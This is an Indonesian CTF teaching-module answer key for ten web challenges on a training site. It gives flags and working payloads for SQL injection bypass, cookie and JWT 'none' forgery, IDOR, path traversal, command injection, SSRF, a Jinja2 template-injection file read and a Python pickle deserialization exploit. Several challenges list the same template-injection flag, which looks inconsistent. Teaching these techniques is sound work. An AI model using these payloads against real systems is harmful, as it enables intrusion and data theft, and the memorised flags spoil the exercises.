# 📘 Panduan Solusi & Cheat Sheet 10 CTF Web Challenges (Modul Ajar)

Dokumen ini berisi daftar kunci jawaban (**Flag**), penjelasan teknik eksploitasi, serta **Payload** untuk menyelesaikan seluruh 10 challenge CTF Web Exploitation.

---

## 🟢 TINGKAT EASY (DASAR)

### 1. DevCompany - Hidden Comments
- **Target URL**: `https://target.paradick.my.id/hidden_comment/`
- **Poin**: 50
- **Topik**: Source Code Reconnaissance & HTML Comment Leak
- **Cara Menyelesaikan**:
  1. Buka URL `https://target.paradick.my.id/hidden_comment/`.
  2. Klik kanan di halaman → pilih **Inspect Element** atau **View Page Source** (`Ctrl+U` / `Cmd+Option+U`).
  3. Cari komentar HTML berikut:
     ```html
     <!-- 
         TODO FOR DEVELOPER TEAM:
         Uncomment hidden administrative endpoint after security audit completes:
         Secret Admin Endpoint: /hidden_comment/secret_admin_dashboard_99
     -->
     ```
  4. Buka URL rahasia tersebut di browser: `https://target.paradick.my.id/hidden_comment/secret_admin_dashboard_99`.
- **Flag**: `CTF{h7ml_c0mm3n7_l34k_d1sc0v3r3d_2026}`

---

### 2. DevNotes - Admin Portal
- **Target URL**: `https://target.paradick.my.id/sqli/`
- **Poin**: 100
- **Topik**: SQL Injection Authentication Bypass
- **Cara Menyelesaikan**:
  1. Buka Halaman Login `https://target.paradick.my.id/sqli/`.
  2. Masukkan ke kolom **Username**: `admin' --`
  3. Masukkan password sembarang (misal: `12345`).
  4. Klik **Authenticate →**.
- **Flag**: `CTF{34sy_sql_1nj3ct10n_byp4ss_2026}`

---

### 3. Cookie Session Inspector
- **Target URL**: `https://target.paradick.my.id/cookie_lab/`
- **Poin**: 100
- **Topik**: Insecure Cookie Manipulation (Base64)
- **Cara Menyelesaikan**:
  1. Buka Developer Tools di browser (`F12` / Inspect) → Tab **Application** / **Storage** → **Cookies**.
  2. Cari cookie bernama `user_session`. Nilai default-nya adalah `cm9sZT1ndWVzdA==` (Base64 dari `role=guest`).
  3. Ubah nilai cookie menjadi Base64 dari `role=admin` yaitu: `cm9sZT1hZG1pbg==`.
  4. Refresh halaman browser.
- **Flag**: `CTF{c00k13_m4n1pul4710n_m4s73r_2026}`

---

## 🟡 TINGKAT MEDIUM (MENENGAH)

### 4. UserProfile Portal
- **Target URL**: `https://target.paradick.my.id/idor/`
- **Poin**: 150
- **Topik**: Insecure Direct Object Reference (IDOR)
- **Cara Menyelesaikan**:
  1. Buka URL `https://target.paradick.my.id/idor/?user_id=102`.
  2. Ubah parameter `user_id` pada URL browser dari `102` menjadi `100`:
     `https://target.paradick.my.id/idor/?user_id=100`
  3. Profil Administrator ID 100 akan terbuka beserta flag rahasianya.
- **Flag**: `CTF{1d0r_pr1v1l3g3_3sc4l4710n_2026}`

---

### 5. File Viewer Pro
- **Target URL**: `https://target.paradick.my.id/lfi/`
- **Poin**: 250
- **Topik**: Path Traversal / Local File Inclusion (LFI)
- **Cara Menyelesaikan**:
  1. Buka URL `https://target.paradick.my.id/lfi/?page=welcome.txt`.
  2. Ganti parameter `page` untuk membaca file flag secara langsung:
     `https://target.paradick.my.id/lfi/?page=flag.txt`
     atau menggunakan traversal:
     `https://target.paradick.my.id/lfi/?page=../../../../flag.txt`
- **Flag**: `CTF{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_m4st3r_2026}`

---

### 6. Ping Diagnostic Utility
- **Target URL**: `https://target.paradick.my.id/rce_ping/`
- **Poin**: 300
- **Topik**: Command Injection / Remote Code Execution (RCE)
- **Cara Menyelesaikan**:
  1. Buka `https://target.paradick.my.id/rce_ping/`.
  2. Di kolom **Target Host IP**, masukkan payload injection dengan pemisah titik koma (`;`):
     ```text
     127.0.0.1; cat /flag.txt
     ```
  3. Klik **Execute Ping Diagnostic ⚡**.
- **Flag**: `CTF{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_m4st3r_2026}`

---

## 🔴 TINGKAT HARD (LANJUTAN)

### 7. URL Content Fetcher
- **Target URL**: `https://target.paradick.my.id/ssrf/`
- **Poin**: 350
- **Topik**: Server-Side Request Forgery (SSRF)
- **Cara Menyelesaikan**:
  1. Buka `https://target.paradick.my.id/ssrf/`.
  2. Di kolom **Target URL to Fetch**, masukkan alamat service internal loopback:
     ```text
     http://127.0.0.1:8000/ssrf/internal/admin/secret
     ```
  3. Klik **Fetch Remote URL 🌐**.
- **Flag**: `CTF{ssrf_1n73rn4l_n37w0rk_4cc3ss_2026}`

---

### 8. JWT Token Inspector
- **Target URL**: `https://target.paradick.my.id/jwt_lab/`
- **Poin**: 400
- **Topik**: JSON Web Token (JWT) Algorithm None / Weak Secret
- **Cara Menyelesaikan**:
  1. Buka Cookie Editor di browser.
  2. Ganti cookie `jwt_auth` dengan token buatan yang menggunakan algoritma `none` (tanpa signature) dan role `admin`:
     - Header (`{"alg":"none","typ":"JWT"}` in base64url): `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
     - Payload (`{"user":"admin","role":"admin"}` in base64url): `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ`
     - Token gabungan: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.`
  3. Set cookie `jwt_auth` dengan nilai di atas lalu refresh halaman.
- **Flag**: `CTF{jw7_w34k_s3cr37_3sc4l4710n_2026}`

---

### 9. CyberVault Report Generator
- **Target URL**: `https://target.paradick.my.id/ssti/`
- **Poin**: 500
- **Topik**: Server-Side Template Injection (SSTI) Jinja2 WAF Bypass
- **Cara Menyelesaikan**:
  1. Buka `https://target.paradick.my.id/ssti/generator`.
  2. Di textarea **Jinja2 Template Definition**, masukkan payload bypass built-in Python:
     ```jinja2
     <div class="report-card">
       <h2>FLAG: {{ self.__init__.__globals__.__builtins__.open('/flag.txt').read() }}</h2>
     </div>
     ```
  3. Klik **Render Report Preview ⚡**.
- **Flag**: `CTF{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_m4st3r_2026}`

---

### 10. Pickle Deserialization Vault
- **Target URL**: `https://target.paradick.my.id/pickle_rce/`
- **Poin**: 500
- **Topik**: Python Pickle Insecure Deserialization RCE
- **Cara Menyelesaikan**:
  1. Jalankan script Python lokal untuk membuat objek `__reduce__` pembaca `/flag.txt`:
     ```python
     import pickle, base64, os
     class Exploit:
         def __reduce__(self):
             return (os.popen, ('cat /flag.txt',))
     print(base64.b64encode(pickle.dumps(Exploit())).decode())
     ```
  2. Set nilai cookie `pickle_session` di browser dengan output base64 tersebut.
  3. Refresh halaman browser.
- **Flag**: `CTF{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_m4st3r_2026}`
